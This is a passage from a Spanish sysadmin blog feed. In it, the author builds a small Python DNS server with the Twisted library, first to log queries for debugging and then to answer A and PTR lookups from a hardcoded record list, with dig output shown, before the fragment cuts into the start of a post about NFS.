&lt;strong&gt;DNS&lt;/strong&gt; de desarrollo. Sin saber claramente porque pasaba, hice un servidor &lt;strong&gt;DNS&lt;/strong&gt; en &lt;strong&gt;python&lt;/strong&gt;, para ver que tipos de peticiones se lanzaban.&lt;/p&gt;
&lt;p&gt;Para hacerlo, utilicé una librería magnífica llamada &lt;strong&gt;twisted&lt;/strong&gt;, que hace la mayoría del trabajo. Aunque su documentación es bastante escasa, tirando de ejemplos pude sacar algo interesante en poco tiempo.&lt;/p&gt;
&lt;h2&gt;Un servidor chivato&lt;/h2&gt;
&lt;p&gt;Cambiamos el fichero &lt;em&gt;/etc/resolv&lt;/em&gt; de nuestro servidor de producción, para añadirle su propia dirección IP, en la que ejecutamos el siguiente &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;twisted.internet&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;defer&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;twisted.names&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;DynamicResolver&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;defer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DomainError&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;factory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DNSServerFactory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;clients&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="n"&gt;DynamicResolver&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DNSDatagramProtocol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;controller&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;factory&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listenUDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10053&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listenTCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10053&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;factory&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;SystemExit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si os interesa trabajar con &lt;em&gt;virtualenv&lt;/em&gt;, aquí os dejo el &lt;em&gt;requirements.txt&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/projects/dns$ cat requirements.txt 
&lt;span class="nv"&gt;Twisted&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;.3.2
zope.interface&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.2.0
gerard@sirius:~/projects/dns$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es el resultado de ejecutar &lt;em&gt;pip install twisted&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Comprobamos lo que pasa cuando el servidor recibe peticiones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; nowhere.com

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.9.5-9+deb8u6-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; nowhere.com
&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; servers found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NXDOMAIN, id: &lt;span class="m"&gt;42644&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr ra&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;0&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;0&lt;/span&gt;

&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;nowhere.com.           IN  A

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;1&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#10053&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Wed Aug &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:29:38 CEST &lt;span class="m"&gt;2016&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;29&lt;/span&gt;

gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y en el otro terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/projects/dns$ ./env/bin/python dns.py 
&amp;lt;Query nowhere.com A IN&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este &lt;em&gt;script&lt;/em&gt; implementa un servidor que no es capaz de encontrar el dominio, pero registra la petición recibida. Con el tipo de peticiones nos dimos cuenta de que había algo mal configurado en el entorno de producción.&lt;/p&gt;
&lt;h2&gt;Añadiendo resolución de peticiones&lt;/h2&gt;
&lt;p&gt;La librería &lt;strong&gt;twisted&lt;/strong&gt; ofrece clases para entender las peticiones y para formular las respuestas. Eso nos da una &lt;em&gt;toolbox&lt;/em&gt; muy interesante para hacer nuestro propio servidor.&lt;/p&gt;
&lt;p&gt;Supongamos que queremos asociar &lt;em&gt;example.com&lt;/em&gt; a las direcciones &lt;em&gt;1.2.3.4&lt;/em&gt; y &lt;em&gt;1.2.3.5&lt;/em&gt;; adicionalmente asociaremos también el nombre &lt;em&gt;example.my&lt;/em&gt; a la dirección &lt;em&gt;1.2.3.5&lt;/em&gt;. Se podría utilizar una base de datos, pero vamos a no hacerlo para mantener el ejemplo pequeño.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;twisted.internet&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;defer&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;twisted.names&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;groupby&lt;/span&gt;

&lt;span class="n"&gt;records&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;example.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1.2.3.4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;example.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1.2.3.5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;example.my&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1.2.3.5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;name2ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;group&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;groupby&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;span class="n"&gt;ip2name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;group&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;groupby&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;DynamicResolver&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;calculate_responses&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;records&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;name2ip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;record&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Record_A&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;record&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PTR&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;aux&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
            &lt;span class="n"&gt;records&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ip2name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;aux&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;record&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Record_PTR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;record&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;responses&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;calculate_responses&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;answers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RRHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;answer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TYPE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;answer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;authority&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="n"&gt;additional&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;defer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;succeed&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;answers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;authority&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;additional&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;factory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DNSServerFactory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;clients&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="n"&gt;DynamicResolver&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DNSDatagramProtocol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;controller&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;factory&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listenUDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10053&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listenTCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10053&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;factory&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;SystemExit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y si ejecutamos este nuevo &lt;em&gt;script&lt;/em&gt; y le lanzamos peticiones, vemos que funciona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; +short example.com
&lt;span class="m"&gt;1&lt;/span&gt;.2.3.4
&lt;span class="m"&gt;1&lt;/span&gt;.2.3.5
gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; +short example.my
&lt;span class="m"&gt;1&lt;/span&gt;.2.3.5
gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; +short nowhere.com
gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; +short -x &lt;span class="m"&gt;1&lt;/span&gt;.2.3.4
example.com.
gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; +short -x &lt;span class="m"&gt;1&lt;/span&gt;.2.3.5
example.com.
example.my.
gerard@sirius:~$ dig @localhost -p &lt;span class="m"&gt;10053&lt;/span&gt; +short -x &lt;span class="m"&gt;1&lt;/span&gt;.2.3.6
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aunque ya hay servidores &lt;strong&gt;DNS&lt;/strong&gt; magníficos, podemos levantar uno con &lt;strong&gt;python&lt;/strong&gt; de forma fácil, rápida y sencilla.&lt;/p&gt;</content><category term="python"></category><category term="dns"></category><category term="twisted"></category></entry><entry><title>Compartiendo carpetas con NFS</title><link href="http://www.linuxsysadmin.ml/2017/02/compartiendo-carpetas-con-nfs.html" rel="alternate"></link><published>2017-02-06T10:00:00+01:00</published><updated>2017-02-06T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-02-06:/2017/02/compartiendo-carpetas-con-nfs.html</id><summary type="html">&lt;p&gt;Son muchas las veces que queremos tener una carpeta disponible en todas las máquinas que usamos habitualmente, sea una unidad de &lt;em&gt;backup&lt;/em&gt;, o sea una carpeta de intercambio de fotos. Disponemos de servidores tipo FTP, pero es mas cómodo tener una unidad remota como una carpeta mas de nuestra máquina …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Son muchas las veces que queremos tener una carpeta disponible en todas las máquinas que usamos habitualmente, sea una unidad de &lt;em&gt;backup&lt;/em&gt;, o sea una carpeta de intercambio de fotos. Disponemos de servidores tipo FTP, pero es mas cómodo tener una unidad remota como una carpeta mas de nuestra 